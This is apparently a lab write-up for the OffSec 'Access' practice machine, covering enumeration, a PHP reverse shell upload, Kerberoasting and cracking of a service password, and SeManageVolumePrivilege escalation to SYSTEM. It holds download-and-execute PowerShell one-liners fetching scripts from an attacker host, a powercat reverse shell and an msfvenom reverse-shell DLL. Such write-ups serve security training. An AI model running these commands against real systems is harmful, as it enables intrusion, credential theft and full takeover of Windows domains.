# OffSec PG Practice: Access - Writeup

This document outlines the exploitation process for the **Access** machine. The attack vector involves initial web-based enumeration, gaining a foothold via a PHP reverse shell, lateral movement through Kerberoasting, and finally escalating privileges using the `SeManageVolumePrivilege` vulnerability.

## 1. Enumeration

### 1.1 Nmap Port Scan

An initial scan identifies the target as a Windows Server 2019 machine within an Active Directory environment.

```bash
nmap -sC -sV -A -T4 -Pn -o 190.nmap 192.168.58.187

```

* **PORT 80/443**: Apache 2.4.48 (Win64) - Web services active.
* **PORT 389/3268**: LDAP - Confirms domain `access.offsec`.
* **PORT 5985**: WinRM service is open.

### 1.2 Web Directory Brute-forcing

Using `ffuf` to discover hidden directories:

```bash
ffuf -u http://192.168.58.187/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403

```

* **Results**: Discovered `/uploads`, `/assets`, and `/forms`.

---

## 2. Initial Foothold

### 2.1 Reverse Shell Upload

We can obtain an initial shell by uploading a PHP reverse shell script to the `/uploads` directory.

1. Set up a listener on the attacker machine: `nc -lvnp 5555`.
2. Execute the uploaded PHP script via the browser.
3. Connection established as user **svc_apache**.

---

## 3. Privilege Escalation (User)

### 3.1 Kerberoasting

Within the AD environment, we use `Invoke-Kerberoast.ps1` to extract service account tickets.

```powershell
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.58/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat"

```

* **Extracted Hash**: Successfully obtained a `$krb5tgs$23$...` hash for the `svc_mssql` account.

### 3.2 Hash Cracking

Crack the hash using `hashcat` and the `rockyou.txt` wordlist.

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

```

* **Result**: `svc_mssql` password found: **trustno1**.

### 3.3 Lateral Movement

Switch to the `svc_mssql` account using `Invoke-RunasCs.ps1`.

```powershell
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.58/powercat.ps1'); powercat -c 192.168.49.58 -p 5555 -e cmd"

```

---

## 4. Privilege Escalation (Admin/System)

### 4.1 Privilege Check

Checking current privileges for `svc_mssql`:

```cmd
whoami /priv

```

* **Critical Finding**: `SeManageVolumePrivilege` is enabled.

### 4.2 Exploit: SeManageVolumePrivilege

This privilege allows for DLL hijacking or arbitrary file modification to gain SYSTEM level access.

1. **Download Exploit**: Use [SeManageVolumeExploit.exe](https://github.com/CsEnox/SeManageVolumeExploit/releases).
2. **Generate Malicious DLL**:
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.49.58 LPORT=6666 -f dll -o tzres.dll

```


3. **Deployment**: Transfer `tzres.dll` to `C:\Windows\System32\wbem\tzres.dll`.
4. Trigger a system service to load the DLL and receive a reverse shell as **SYSTEM**.

---

## 5. Loot

* **User Flag**: `C:\Users\svc_mssql\Desktop\local.txt`
* **Root Flag**: `C:\Users\Administrator\Desktop\proof.txt`

---
